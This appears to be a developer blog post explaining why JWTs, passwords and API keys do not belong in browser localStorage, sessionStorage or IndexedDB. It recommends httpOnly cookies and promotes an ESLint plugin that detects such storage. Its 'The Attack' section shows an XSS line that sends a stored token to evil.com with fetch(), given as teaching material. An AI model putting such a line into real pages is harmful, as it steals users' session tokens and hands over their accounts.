---
title: 'localStorage is Not for Secrets: Browser Storage Security'
published: false
description: 'Storing JWTs in localStorage? Credentials in sessionStorage? Here is why that is dangerous and what to use instead.'
tags: javascript, security, browser, eslint
cover_image:
series: Browser Security
---

# localStorage is Not for Secrets: Browser Storage Security

```javascript
localStorage.setItem('auth_token', jwt);
```

This is one of the most common security mistakes in frontend development.

## Why localStorage is Dangerous

| Threat              | localStorage   | httpOnly Cookie |
| ------------------- | -------------- | --------------- |
| XSS Access          | ✅ Vulnerable  | ❌ Protected    |
| Same-origin scripts | ✅ Full access | ❌ No access    |
| Browser extensions  | ✅ Can read    | ❌ Cannot read  |
| CSRF                | ❌ Protected   | ⚠️ Needs config |

**One XSS vulnerability = all localStorage data stolen.**

## The Attack

```javascript
// Your app stores the token:
localStorage.setItem('token', jwt);

// Attacker injects via XSS:
fetch(`https://evil.com/steal?token=${localStorage.getItem('token')}`);

// Attacker now has full access to the user's account
```

## What NOT to Store

```javascript
// ❌ Never store these in browser storage
localStorage.setItem('token', jwt);
localStorage.setItem('password', password);
localStorage.setItem('api_key', apiKey);
localStorage.setItem('ssn', socialSecurityNumber);
localStorage.setItem('credit_card', cardNumber);

sessionStorage.setItem('auth', authData);
```

## Safe Alternatives

### For Authentication Tokens

```javascript
// ❌ Dangerous
localStorage.setItem('token', jwt);
fetch('/api', {
  headers: { Authorization: `Bearer ${localStorage.getItem('token')}` },
});

// ✅ Use httpOnly cookies (set by backend)
// Backend sets:
res.cookie('token', jwt, {
  httpOnly: true, // No JavaScript access
  secure: true, // HTTPS only
  sameSite: 'strict',
});

// Frontend just makes requests - cookie sent automatically
fetch('/api', { credentials: 'include' });
```

### For Session Data

```javascript
// ❌ Storing session in localStorage
localStorage.setItem('user', JSON.stringify(userData));

// ✅ Store only non-sensitive preferences
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'en');
```

### For API Keys

```javascript
// ❌ API key in frontend
const API_KEY = 'sk_live_xxx';
fetch(`https://api.stripe.com?key=${API_KEY}`);

// ✅ Proxy through your backend
fetch('/api/create-payment', { method: 'POST' });
// Backend has the API key, not the browser
```

## IndexedDB Has the Same Problem

```javascript
// ❌ Also vulnerable to XSS
const db = await openDB('MyApp', 1);
await db.put('auth', { token: jwt });

// ✅ Encrypt sensitive data if you must use IndexedDB
import { encrypt } from './crypto';
await db.put('auth', { token: encrypt(jwt, sessionKey) });
```

## ESLint Rules

```javascript
// eslint.config.js
import browserSecurity from 'eslint-plugin-browser-security';

export default [
  {
    plugins: { 'browser-security': browserSecurity },
    rules: {
      'browser-security/no-sensitive-localstorage': 'error',
      'browser-security/no-sensitive-sessionstorage': 'error',
      'browser-security/no-sensitive-indexeddb': 'error',
      'browser-security/no-jwt-in-storage': 'error',
      'browser-security/no-cookie-auth-tokens': 'warn',
    },
  },
];
```

### Detection Patterns

The rules detect:

- Variables named `token`, `jwt`, `password`, `secret`, `key`, `credential`
- Values matching JWT patterns (`eyJ...`)
- Sensitive property names (`auth`, `apiKey`, `ssn`)

### Error Output

```bash
src/auth.ts
  18:1  error  🔒 CWE-922 | Sensitive data 'token' stored in localStorage
               Risk: XSS attacks can steal authentication tokens
               Fix: Use httpOnly cookies for auth tokens

  25:1  error  🔒 CWE-312 | JWT stored in sessionStorage
               Risk: Any XSS vulnerability exposes user sessions
               Fix: Store JWTs in httpOnly cookies set by the server
```

## The Secure Pattern

```
┌─────────────────────────────────────────────────────┐
│                    Frontend                          │
├─────────────────────────────────────────────────────┤
│ localStorage:                                        │
│   ✅ theme: "dark"                                   │
│   ✅ language: "en"                                  │
│   ✅ lastVisitedPage: "/dashboard"                   │
│   ❌ NO tokens, passwords, PII                       │
└───────────────────────┬─────────────────────────────┘
                        │ fetch with credentials
                        ▼
┌─────────────────────────────────────────────────────┐
│                    Backend                           │
├─────────────────────────────────────────────────────┤
│ httpOnly Cookies:                                    │
│   ✅ session_token (httpOnly, secure, sameSite)      │
│   ✅ refresh_token (httpOnly, secure, sameSite)      │
│                                                      │
│ Server-side storage:                                 │
│   ✅ API keys, secrets, credentials                  │
└─────────────────────────────────────────────────────┘
```

## Quick Install

{% cta https://npmjs.com/package/eslint-plugin-browser-security %}
📦 npm install eslint-plugin-browser-security
{% endcta %}

```javascript
import browserSecurity from 'eslint-plugin-browser-security';
export default [browserSecurity.configs.recommended];
```

---

📦 [npm: eslint-plugin-browser-security](https://www.npmjs.com/package/eslint-plugin-browser-security)
📖 [Rule: no-sensitive-localstorage](https://github.com/ofri-peretz/eslint/tree/main/packages/eslint-plugin-browser-security/docs/rules/no-sensitive-localstorage.md)

{% cta https://github.com/ofri-peretz/eslint %}
⭐ Star on GitHub
{% endcta %}

---

🚀 **Where do you store your auth tokens? Share your approach!**

[GitHub](https://github.com/ofri-peretz) | [LinkedIn](https://linkedin.com/in/ofri-peretz)
